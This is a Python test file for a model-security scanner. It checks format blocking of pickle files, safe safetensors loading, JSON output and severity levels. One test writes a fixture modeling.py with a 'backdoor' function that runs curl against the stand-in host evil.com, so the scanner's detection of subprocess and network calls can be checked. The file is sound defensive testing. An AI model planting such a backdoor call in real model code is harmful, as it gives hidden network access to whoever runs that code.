#!/usr/bin/env python3
"""
Simple test for model-security module.

Tests the ModelSecurityScanner and SecureModelLoader against a sample model.
"""

import sys
import os
import tempfile
import json
from pathlib import Path

# Add model-security to path
sys.path.insert(0, str(Path(__file__).parent / "platform-security" / "model-security"))

from scanner import ModelSecurityScanner, ScanResult, Finding, Severity


def test_scanner_initialization():
    """Test scanner can be initialized"""
    print("Test: Scanner initialization... ", end="")
    scanner = ModelSecurityScanner()
    assert scanner is not None
    assert scanner.strict_mode == True
    assert scanner.allow_pickle == False
    print("✓")


def test_scanner_with_safe_model():
    """Test scanning a directory with safe files"""
    print("Test: Scan safe model directory... ", end="")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a fake safe model directory
        config = {
            "model_type": "llama",
            "hidden_size": 4096
        }
        with open(os.path.join(tmpdir, "config.json"), "w") as f:
            json.dump(config, f)
        
        # Create a dummy safetensors file (empty, but correct extension)
        Path(os.path.join(tmpdir, "model.safetensors")).touch()
        
        scanner = ModelSecurityScanner()
        result = scanner.scan_model(tmpdir)
        
        assert result.passed == True, f"Expected pass, got findings: {[f.message for f in result.findings]}"
        assert "FormatChecker" in result.scanners_run
    
    print("✓")


def test_scanner_blocks_pickle():
    """Test scanner blocks pickle files"""
    print("Test: Block pickle files... ", end="")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a .pt file (pickle-based, should be blocked)
        Path(os.path.join(tmpdir, "model.pt")).touch()
        
        scanner = ModelSecurityScanner(allow_pickle=False)
        result = scanner.scan_model(tmpdir)
        
        assert result.passed == False, "Expected fail for pickle file"
        assert any(f.category == "BLOCKED_FORMAT" for f in result.findings)
    
    print("✓")


def test_scanner_detects_dangerous_code():
    """Test scanner detects dangerous patterns in Python files"""
    print("Test: Detect dangerous code patterns... ", end="")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create a Python file with dangerous pattern
        malicious_code = '''
import os
import subprocess

def backdoor():
    subprocess.run(["curl", "http://evil.com"])
'''
        with open(os.path.join(tmpdir, "modeling.py"), "w") as f:
            f.write(malicious_code)
        
        scanner = ModelSecurityScanner()
        result = scanner.scan_model(tmpdir)
        
        assert result.passed == False, "Expected fail for dangerous code"
        assert any(f.category in ["SUBPROCESS", "NETWORK_HTTP"] for f in result.findings)
    
    print("✓")


def test_scanner_json_output():
    """Test scanner produces valid JSON output"""
    print("Test: JSON output format... ", end="")
    
    with tempfile.TemporaryDirectory() as tmpdir:
        Path(os.path.join(tmpdir, "model.safetensors")).touch()
        
        scanner = ModelSecurityScanner()
        result = scanner.scan_model(tmpdir)
        
        json_str = result.to_json()
        parsed = json.loads(json_str)
        
        assert "passed" in parsed
        assert "findings" in parsed
        assert "scanners_run" in parsed
    
    print("✓")


def test_severity_levels():
    """Test severity enumeration"""
    print("Test: Severity levels... ", end="")
    
    assert Severity.CRITICAL.value == "CRITICAL"
    assert Severity.HIGH.value == "HIGH"
    assert Severity.MEDIUM.value == "MEDIUM"
    assert Severity.LOW.value == "LOW"
    
    print("✓")


def run_all_tests():
    """Run all tests"""
    print("=" * 50)
    print("Model Security Module Tests")
    print("=" * 50)
    print()
    
    tests = [
        test_scanner_initialization,
        test_scanner_with_safe_model,
        test_scanner_blocks_pickle,
        test_scanner_detects_dangerous_code,
        test_scanner_json_output,
        test_severity_levels,
    ]
    
    passed = 0
    failed = 0
    
    for test in tests:
        try:
            test()
            passed += 1
        except AssertionError as e:
            print(f"✗ FAILED: {e}")
            failed += 1
        except Exception as e:
            print(f"✗ ERROR: {e}")
            failed += 1
    
    print()
    print("=" * 50)
    print(f"Results: {passed} passed, {failed} failed")
    print("=" * 50)
    
    return failed == 0


if __name__ == "__main__":
    success = run_all_tests()
    sys.exit(0 if success else 1)
